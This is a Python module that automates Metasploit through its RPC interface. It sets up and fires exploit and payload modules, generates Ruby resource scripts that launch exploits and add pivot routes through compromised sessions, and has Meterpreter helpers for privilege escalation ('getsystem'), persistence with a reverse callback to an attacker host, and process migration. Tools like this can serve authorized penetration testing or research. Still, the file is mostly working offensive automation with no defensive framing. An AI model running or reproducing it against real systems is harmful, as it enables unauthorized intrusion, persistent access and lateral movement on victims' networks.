import os
import socket
import uuid

from pymetasploit3.msfconsole import MsfRpcConsole

from configuration import (REMOTE_RESOURCE_DIRECTORY, SESSION_FAIL_TO_OPEN,
                           SESSION_SUCCESSFULLY_OPEND)
from py_client import scp


def get_unused_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('localhost', 0))
    addr, port = s.getsockname()
    s.close()
    return port


def get_current_host_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    current_host_ip = s.getsockname()[0]
    s.close()
    return current_host_ip


class BasicUsage:
    def __init__(self, client, **options):
        self._client = client
        self._components = {}
        for k1, v1 in options.items():
            self.set_options(**options)

    def set_options(self, **options):
        for k1, v1 in options.items():
            self._components[k1] = self._client.modules.use(k1, v1['name'])
            for k2, v2 in v1.items():
                if not k2 == 'name':
                    self._components[k1][k2] = v2

    def clear_components(self):
        self._components.clear()

    def exploit(self):
        for k, v in self._components.items():
            if v.missing_required:
                print("{} missing required: {}".format(k, v.missing_required))
        exploit_component = self._components.get('exploit')
        if not exploit_component:
            print(
                self._console.run_module_with_output(
                    self._components.get('auxiliary')))
        else:
            payload_component = self._components.get('payload')
            if payload_component:
                self._console.run_module_with_output(exploit_component,
                                                     payload=payload_component)
            else:
                self._console.run_module_with_output(exploit_component)

    def escalate_privilege(self, shell):
        return shell.run_with_output("getsystem")

    def persistence_exploitation(self, shell, lport=None, lhost=None):
        if not lport or not lhost:
            return shell.run_with_output("run persistence -U -i 5")
        else:
            return shell.run_with_output(
                f"run persistence -U -i 5 -p {lport} -r {lhost}")

    def get_current_active_processes(self, shell):
        return shell.run_with_output("ps")

    def migrate_to_other_process(self, shell, pid):
        return shell.run_with_output("migrate {}".format(pid))

    def get_sys_info(self, shell):
        return shell.run_with_output("sysinfo")

    def generate_resource_script(self, scriptname="tasks.rc", subnet=None):
        abs_path = os.path.abspath(f"resourcescripts/{scriptname}")
        with open(abs_path, 'a+') as f:
            exploit = self._components.get('exploit')
            f.write("<ruby>\n")
            if exploit:
                f.write(f"current_rhosts = '{exploit['RHOSTS']}'\n")
                f.write(f"succeed_signal='{SESSION_SUCCESSFULLY_OPEND}'\n")
                f.write(f"fail_signal='{SESSION_FAIL_TO_OPEN}'\n")
                f.write(f"run_single('use {exploit.fullname}')\n")
                for option in exploit.required:
                    if option.startswith('Check'):
                        continue
                    f.write(
                        f"run_single('set {option} {exploit.runoptions[option]}')\n"
                    )
            payload = self._components.get('payload')
            if payload:
                f.write(f"run_single('set payload {payload.fullname}')\n")
                for option in payload.required:
                    f.write(
                        f"run_single('set {option} {payload.runoptions[option]}')\n"
                    )
            f.write(f"run_single('set SRVPORT {get_unused_port()}')\n")
            f.write(f"run_single('set LPORT {get_unused_port()}')\n")
            f.write("run_single('exploit -J -z')\n")
            f.write("""
                    newest_session_id = framework.sessions.keys.max
                    print_line ""
                    if framework.sessions[newest_session_id].target_host == current_rhosts
                    """)

            if subnet:
                f.write("run_single(\"route add " + subnet +
                        " #{newest_session_id}\")\n")

            f.write("""
                    print_line succeed_signal
                    """)
            f.write("""
                    else
                    print_line fail_signal
                    end
                    print_line ""
                    """)
            f.write("</ruby>")
            f.write("\n")
            f.flush()
        if scp:
            scp.put(abs_path, REMOTE_RESOURCE_DIRECTORY)

    def execute_resource_script(self, scriptname="tasks.rc", cb=None):
        if scp:
            abs_path = os.path.abspath(
                f"{REMOTE_RESOURCE_DIRECTORY}/{scriptname}")
        else:
            abs_path = os.path.abspath(f"resourcescripts/{scriptname}")
        print('abs path')
        print(abs_path)
        console = MsfRpcConsole(self._client)
        console.callback = cb
        console.execute(f"resource {abs_path}")

    def generate_new_workspace(self):
        workspace = str(uuid.uuid4())
        console = MsfRpcConsole(self._client)
        console.execute(f"workspace -a {workspace}")
        console.execute(f"workspace {workspace}")
        return workspace

    @classmethod
    def clear_resource_script(cls, scriptname="tasks.rc"):
        abs_path = os.path.abspath(f"resourcescripts/{scriptname}")
        if os.path.exists(abs_path):
            os.remove(abs_path)
